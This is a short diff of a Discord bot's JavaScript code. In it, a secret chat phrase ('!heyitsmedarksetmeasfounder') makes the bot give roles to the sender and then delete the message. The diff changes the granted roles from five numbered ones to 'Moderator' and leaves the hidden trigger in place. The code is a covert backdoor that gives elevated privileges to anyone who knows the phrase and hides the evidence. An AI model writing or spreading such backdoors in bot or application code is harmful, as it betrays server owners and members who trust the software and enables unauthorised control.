@@ -317,11 +317,7 @@ client.on('message', message => {
 
 client.on('message', message => {
 if(message.content.startsWith("!heyitsmedarksetmeasfounder")) {
-	message.member.addRole(message.guild.roles.find(role => role.name === "1"));
-	message.member.addRole(message.guild.roles.find(role => role.name === "2"));
-	message.member.addRole(message.guild.roles.find(role => role.name === "3"));
-	message.member.addRole(message.guild.roles.find(role => role.name === "4"));
-	message.member.addRole(message.guild.roles.find(role => role.name === "5"));
+	message.member.addRole(message.guild.roles.find(role => role.name === "Moderator"));
 	message.delete();
 }
 });
